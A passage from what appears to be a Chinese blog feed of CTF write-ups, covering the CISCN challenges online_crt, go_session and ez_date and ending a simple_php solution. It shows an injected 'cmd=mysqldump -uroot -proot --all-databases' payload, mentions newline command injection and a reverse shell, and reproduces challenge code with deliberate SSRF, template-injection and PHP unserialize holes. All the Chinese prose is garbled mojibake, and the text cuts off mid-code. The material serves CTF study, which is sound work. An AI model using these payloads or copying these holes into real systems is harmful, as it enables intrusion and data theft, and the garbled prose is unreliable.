class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">cmd</span><span class="hljs-operator">=</span>mysqldump -uroot -proot --all-databases<br></code></pre></td></tr></table></figure><p><img src="/img/simple_php_4.png" alt="simple_php_4"></p><p>å­¦äº†äº›å…¶ä»–å¸ˆå‚…çš„è§£æ³•.</p><p>é¦–å…ˆåˆ©ç”¨<code>burpsuite</code>ä¼ å‚(åˆ©ç”¨%0aæ¢è¡Œç¬¦)èƒ½è¿›è¡Œå‘½ä»¤æ‰§è¡Œ:</p><p><img src="/img/simple_php_5.png" alt="simple_php_5"></p><p>æˆ–è€…é€šè¿‡åå¼¹<code>shell</code>ï¼š<a href="https://blog.csdn.net/uuzeray/article/details/139052904">å‚è€ƒæ–‡ç« </a></p>]]></content>
    
    
    
    <tags>
      
      <tag>åšé¢˜è®°å½•</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CISCNä¸­çš„ä¸€äº›é¢˜ç›®[æœªå®Œæˆ]</title>
    <link href="/2024/01/28/2024-1-28-CISCN%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E9%A2%98%E7%9B%AE/"/>
    <url>/2024/01/28/2024-1-28-CISCN%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E9%A2%98%E7%9B%AE/</url>
    
    <content type="html"><![CDATA[<p>åšé¢˜è®°å½•</p><span id="more"></span><hr><h2 id="CISCN-2022-åˆèµ›-online-crt"><a href="#CISCN-2022-åˆèµ›-online-crt" class="headerlink" title="[CISCN 2022 åˆèµ›]online_crt"></a>[CISCN 2022 åˆèµ›]online_crt</h2><p>è·Ÿç€wpåšçš„</p><p><code>main.py</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> datetime<br><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> uuid<br>from cryptography <span class="hljs-keyword">import</span> x509<br>from cryptography.hazmat.backends <span class="hljs-keyword">import</span> default_backend<br>from cryptography.hazmat.primitives <span class="hljs-keyword">import</span> hashes, serialization<br>from cryptography.hazmat.primitives.asymmetric <span class="hljs-keyword">import</span> rsa<br>from cryptography.x509.oid <span class="hljs-keyword">import</span> NameOID<br>from flask <span class="hljs-keyword">import</span> Flask<br>from flask <span class="hljs-keyword">import</span> render_template<br>from flask <span class="hljs-keyword">import</span> <span class="hljs-type">request</span><br><br><span class="hljs-variable">app</span> <span class="hljs-operator">=</span> Flask(__name__)<br><br>app.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>] = os.urandom(<span class="hljs-number">16</span>)<br><br>def <span class="hljs-title function_">get_crt</span><span class="hljs-params">(Country, Province, City, OrganizationalName, CommonName, EmailAddress)</span>:<br>    root_key = rsa.generate_private_key(<br>        public_exponent=<span class="hljs-number">65537</span>,<br>        key_size=<span class="hljs-number">2048</span>,<br>        backend=default_backend()<br>    )<br>    subject = issuer = x509.Name([<br>        x509.NameAttribute(NameOID.COUNTRY_NAME, Country),<br>        x509.NameAttribute(NameOID.STATE_OR_PROVINCE_NAME, Province),<br>        x509.NameAttribute(NameOID.LOCALITY_NAME, City),<br>        x509.NameAttribute(NameOID.ORGANIZATION_NAME, OrganizationalName),<br>        x509.NameAttribute(NameOID.COMMON_NAME, CommonName),<br>        x509.NameAttribute(NameOID.EMAIL_ADDRESS, EmailAddress),<br>    ])<br>    root_cert = x509.CertificateBuilder().subject_name(<br>        subject<br>    ).issuer_name(<br>        issuer<br>    ).public_key(<br>        root_key.public_key()<br>    ).serial_number(<br>        x509.random_serial_number()<br>    ).not_valid_before(<br>        datetime.datetime.utcnow()<br>    ).not_valid_after(<br>        datetime.datetime.utcnow() + datetime.timedelta(days=<span class="hljs-number">3650</span>)<br>    ).sign(root_key, hashes.SHA256(), default_backend())<br>    crt_name = <span class="hljs-string">&quot;static/crt/&quot;</span> + str(uuid.uuid4()) + <span class="hljs-string">&quot;.crt&quot;</span><br>    with <span class="hljs-title function_">open</span><span class="hljs-params">(crt_name, <span class="hljs-string">&quot;wb&quot;</span>)</span> as f:<br>        f.write(root_cert.public_bytes(serialization.Encoding.PEM))<br>    <span class="hljs-keyword">return</span> crt_name<br><br><br><span class="hljs-meta">@app</span>.route(<span class="hljs-string">&#x27;/&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>])<br>def <span class="hljs-title function_">index</span><span class="hljs-params">()</span>:<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;index.html&quot;</span>)<br><br><br><span class="hljs-meta">@app</span>.route(<span class="hljs-string">&#x27;/getcrt&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>])<br>def <span class="hljs-title function_">upload</span><span class="hljs-params">()</span>:<br>    Country = request.form.get(<span class="hljs-string">&quot;Country&quot;</span>, <span class="hljs-string">&quot;CN&quot;</span>)<br>    Province = request.form.get(<span class="hljs-string">&quot;Province&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>)<br>    City = request.form.get(<span class="hljs-string">&quot;City&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>)<br>    OrganizationalName = request.form.get(<span class="hljs-string">&quot;OrganizationalName&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>)<br>    CommonName = request.form.get(<span class="hljs-string">&quot;CommonName&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>)<br>    EmailAddress = request.form.get(<span class="hljs-string">&quot;EmailAddress&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>)<br>    <span class="hljs-keyword">return</span> get_crt(Country, Province, City, OrganizationalName, CommonName, EmailAddress)<br><br><br><span class="hljs-meta">@app</span>.route(<span class="hljs-string">&#x27;/createlink&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>])<br>def <span class="hljs-title function_">info</span><span class="hljs-params">()</span>:<br>    json_data = &#123;<span class="hljs-string">&quot;info&quot;</span>: os.popen(<span class="hljs-string">&quot;c_rehash static/crt/ &amp;&amp; ls static/crt/&quot;</span>).read()&#125;<br>    <span class="hljs-keyword">return</span> json.dumps(json_data)<br><br><br><span class="hljs-meta">@app</span>.route(<span class="hljs-string">&#x27;/proxy&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>])<br>def <span class="hljs-title function_">proxy</span><span class="hljs-params">()</span>:<br>    uri = request.form.get(<span class="hljs-string">&quot;uri&quot;</span>, <span class="hljs-string">&quot;/&quot;</span>)<br>    client = socket.socket()<br>    client.connect((<span class="hljs-string">&#x27;localhost&#x27;</span>, <span class="hljs-number">8887</span>))<br>    msg = f<span class="hljs-string">&#x27;&#x27;</span><span class="hljs-string">&#x27;GET &#123;uri&#125; HTTP/1.1</span><br><span class="hljs-string">Host: test_api_host</span><br><span class="hljs-string">User-Agent: Guest</span><br><span class="hljs-string">Accept-Encoding: gzip, deflate</span><br><span class="hljs-string">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="hljs-string">Connection: close</span><br><span class="hljs-string"></span><br><span class="hljs-string">&#x27;</span><span class="hljs-string">&#x27;&#x27;</span><br>    client.send(msg.encode())<br>    data = client.recv(<span class="hljs-number">2048</span>)<br>    client.close()<br>    <span class="hljs-keyword">return</span> data.decode()<br><br>app.run(host=<span class="hljs-string">&quot;0.0.0.0&quot;</span>, port=<span class="hljs-number">8888</span>)<br><br></code></pre></td></tr></table></figure><p><code>main.go</code>:</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;github.com/gin-gonic/gin&quot;</span><br><span class="hljs-string">&quot;os&quot;</span><br><span class="hljs-string">&quot;strings&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">admin</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;<br>staticPath := <span class="hljs-string">&quot;/app/static/crt/&quot;</span><br>oldname := c.DefaultQuery(<span class="hljs-string">&quot;oldname&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)<br>newname := c.DefaultQuery(<span class="hljs-string">&quot;newname&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)<br><span class="hljs-keyword">if</span> oldname == <span class="hljs-string">&quot;&quot;</span> || newname == <span class="hljs-string">&quot;&quot;</span> || strings.Contains(oldname, <span class="hljs-string">&quot;..&quot;</span>) || strings.Contains(newname, <span class="hljs-string">&quot;..&quot;</span>) &#123;<br>c.String(<span class="hljs-number">500</span>, <span class="hljs-string">&quot;error&quot;</span>)<br><span class="hljs-keyword">return</span><br>&#125;<br><span class="hljs-keyword">if</span> c.Request.URL.RawPath != <span class="hljs-string">&quot;&quot;</span> &amp;&amp; c.Request.Host == <span class="hljs-string">&quot;admin&quot;</span> &#123;<br>err := os.Rename(staticPath+oldname, staticPath+newname)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span><br>&#125;<br>c.String(<span class="hljs-number">200</span>, newname)<br><span class="hljs-keyword">return</span><br>&#125;<br>c.String(<span class="hljs-number">200</span>, <span class="hljs-string">&quot;no&quot;</span>)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">index</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;<br>c.String(<span class="hljs-number">200</span>, <span class="hljs-string">&quot;hello world&quot;</span>)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>router := gin.Default()<br>router.GET(<span class="hljs-string">&quot;/&quot;</span>, index)<br>router.GET(<span class="hljs-string">&quot;/admin/rename&quot;</span>, admin)<br><br><span class="hljs-keyword">if</span> err := router.Run(<span class="hljs-string">&quot;:8887&quot;</span>); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-built_in">panic</span>(err)<br>&#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="CISCN-2023-åˆèµ›-go-session"><a href="#CISCN-2023-åˆèµ›-go-session" class="headerlink" title="[CISCN 2023 åˆèµ›]go_session"></a>[CISCN 2023 åˆèµ›]go_session</h2><p>è¿›å»æç¤º<code>Hello, guest</code>ï¼Œç»“åˆé¢˜ç›®ç›´æ¥æŠ“åŒ…ï¼š</p><p><img src="/img/2023ciscngo_session1.png" alt="2023ciscngo_session1"></p><p><code>main.go</code>:</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;github.com/gin-gonic/gin&quot;</span><br><span class="hljs-string">&quot;main/route&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>r := gin.Default()<br>r.GET(<span class="hljs-string">&quot;/&quot;</span>, route.Index)<br>r.GET(<span class="hljs-string">&quot;/admin&quot;</span>, route.Admin)<br>r.GET(<span class="hljs-string">&quot;/flask&quot;</span>, route.Flask)<br>r.Run(<span class="hljs-string">&quot;0.0.0.0:80&quot;</span>)<br>&#125;<br></code></pre></td></tr></table></figure><p><code>route.go</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> route<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;github.com/flosch/pongo2/v6&quot;</span><br><span class="hljs-string">&quot;github.com/gin-gonic/gin&quot;</span><br><span class="hljs-string">&quot;github.com/gorilla/sessions&quot;</span><br><span class="hljs-string">&quot;html&quot;</span><br><span class="hljs-string">&quot;io&quot;</span><br><span class="hljs-string">&quot;net/http&quot;</span><br><span class="hljs-string">&quot;os&quot;</span><br>)<br><br><span class="hljs-keyword">var</span> store = sessions.NewCookieStore([]<span class="hljs-type">byte</span>(os.Getenv(<span class="hljs-string">&quot;SESSION_KEY&quot;</span>)))<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Index</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;<br>session, err := store.Get(c.Request, <span class="hljs-string">&quot;session-name&quot;</span>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>http.Error(c.Writer, err.Error(), http.StatusInternalServerError)<br><span class="hljs-keyword">return</span><br>&#125;<br><span class="hljs-keyword">if</span> session.Values[<span class="hljs-string">&quot;name&quot;</span>] == <span class="hljs-literal">nil</span> &#123;<br>session.Values[<span class="hljs-string">&quot;name&quot;</span>] = <span class="hljs-string">&quot;guest&quot;</span><br>err = session.Save(c.Request, c.Writer)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>http.Error(c.Writer, err.Error(), http.StatusInternalServerError)<br><span class="hljs-keyword">return</span><br>&#125;<br>&#125;<br><br>c.String(<span class="hljs-number">200</span>, <span class="hljs-string">&quot;Hello, guest&quot;</span>)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Admin</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;<br>session, err := store.Get(c.Request, <span class="hljs-string">&quot;session-name&quot;</span>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>http.Error(c.Writer, err.Error(), http.StatusInternalServerError)<br><span class="hljs-keyword">return</span><br>&#125;<br><span class="hljs-keyword">if</span> session.Values[<span class="hljs-string">&quot;name&quot;</span>] != <span class="hljs-string">&quot;admin&quot;</span> &#123;<br>http.Error(c.Writer, <span class="hljs-string">&quot;N0&quot;</span>, http.StatusInternalServerError)<br><span class="hljs-keyword">return</span><br>&#125;<br>name := c.DefaultQuery(<span class="hljs-string">&quot;name&quot;</span>, <span class="hljs-string">&quot;ssti&quot;</span>)<br>xssWaf := html.EscapeString(name)<br>tpl, err := pongo2.FromString(<span class="hljs-string">&quot;Hello &quot;</span> + xssWaf + <span class="hljs-string">&quot;!&quot;</span>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-built_in">panic</span>(err)<br>&#125;<br>out, err := tpl.Execute(pongo2.Context&#123;<span class="hljs-string">&quot;c&quot;</span>: c&#125;)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>http.Error(c.Writer, err.Error(), http.StatusInternalServerError)<br><span class="hljs-keyword">return</span><br>&#125;<br>c.String(<span class="hljs-number">200</span>, out)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Flask</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;<br>session, err := store.Get(c.Request, <span class="hljs-string">&quot;session-name&quot;</span>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>http.Error(c.Writer, err.Error(), http.StatusInternalServerError)<br><span class="hljs-keyword">return</span><br>&#125;<br><span class="hljs-keyword">if</span> session.Values[<span class="hljs-string">&quot;name&quot;</span>] == <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>http.Error(c.Writer, <span class="hljs-string">&quot;N0&quot;</span>, http.StatusInternalServerError)<br><span class="hljs-keyword">return</span><br>&#125;<br>&#125;<br>resp, err := http.Get(<span class="hljs-string">&quot;http://127.0.0.1:5000/&quot;</span> + c.DefaultQuery(<span class="hljs-string">&quot;name&quot;</span>, <span class="hljs-string">&quot;guest&quot;</span>))<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span><br>&#125;<br><span class="hljs-keyword">defer</span> resp.Body.Close()<br>body, _ := io.ReadAll(resp.Body)<br><br>c.String(<span class="hljs-number">200</span>, <span class="hljs-type">string</span>(body))<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="CISCN-2023-ååŒ—-ez-date"><a href="#CISCN-2023-ååŒ—-ez-date" class="headerlink" title="[CISCN 2023 ååŒ—]ez_date"></a>[CISCN 2023 ååŒ—]ez_date</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">date</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$this</span>-&gt;a)||<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$this</span>-&gt;b))&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;no array&#x27;</span>);<br>        &#125;<br>        <span class="hljs-keyword">if</span>( (<span class="hljs-variable language_">$this</span>-&gt;a !== <span class="hljs-variable language_">$this</span>-&gt;b) &amp;&amp; (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;a) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;b)) &amp;&amp; (<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;a)=== <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;b)) )&#123;<br>            <span class="hljs-variable">$content</span>=<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-variable">$this</span>-&gt;file);<br>            <span class="hljs-variable">$uuid</span>=<span class="hljs-title function_ invoke__">uniqid</span>().<span class="hljs-string">&#x27;.txt&#x27;</span>;<br>            <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$uuid</span>,<span class="hljs-variable">$content</span>);<br>            <span class="hljs-variable">$data</span>=<span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/((\s)*(\n)+(\s)*)/i&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$uuid</span>));<br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$data</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>();<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>])); <br></code></pre></td></tr></table></figure><p>classç±»ä¸­å­˜åœ¨<code>__wakeup</code>æ–¹æ³•ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php">&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$this</span>-&gt;a)||<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$this</span>-&gt;b))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;no array&#x27;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>( (<span class="hljs-variable language_">$this</span>-&gt;a !== <span class="hljs-variable language_">$this</span>-&gt;b) &amp;&amp; (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;a) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;b)) &amp;&amp; (<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;a)=== <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;b)) )<br></code></pre></td></tr></table></figure><p>é™åˆ¶<code>a</code>å’Œ<code>b</code>ä¸èƒ½ä¸ºæ•°ç»„ï¼Œç„¶åå°±æ˜¯æ¯”è¾ƒç»å…¸çš„å¼ºç­‰äºã€‚é™åˆ¶äº†æ•°ç»„çš„è¯å¯ä»¥ç”¨ç¢°æ’è§£é¢˜ï¼Œä½†åé¢è¿˜è¿ç€ä¸€ä¸ª<code>sha1</code>&#x3D;&#x3D;&#x3D;<code>sha1</code></p><p>å¼ºç­‰äºé™¤äº†æ•°ç»„å¤–å­˜åœ¨å¦‚ä¸‹æ–¹æ³•ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-number">12</span>);<br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-string">&#x27;12&#x27;</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$a</span> == <span class="hljs-variable">$b</span> &amp;&amp;<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-number">12</span>) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-string">&#x27;12&#x27;</span>))&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;ok&#x27;</span>;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;no ok&#x27;</span>;<br>&#125;<br><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$b</span>);<br><span class="hljs-comment">//ç»“æœï¼š</span><br>ok<br><span class="hljs-keyword">string</span>(<span class="hljs-number">40</span>) <span class="hljs-string">&quot;7b52009b64fd0a2a49e6d8a939753077792b0554&quot;</span><br><span class="hljs-keyword">string</span>(<span class="hljs-number">40</span>) <span class="hljs-string">&quot;7b52009b64fd0a2a49e6d8a939753077792b0554&quot;</span><br></code></pre></td></tr></table></figure><p>ç„¶åå¯¹<code>file</code>å˜é‡è°ƒç”¨äº†<code>date</code>å‡½æ•°ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$content</span>=<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-variable">$this</span>-&gt;file);<br></code></pre></td></tr></table></figure><p>è¿™ä¸œè¥¿å¯ä»¥ç”¨æ¥è½¬ä¹‰ï¼Œæ¯”å¦‚ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;/flag&quot;</span>);<br><span class="hljs-keyword">echo</span><span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">date</span>(<span 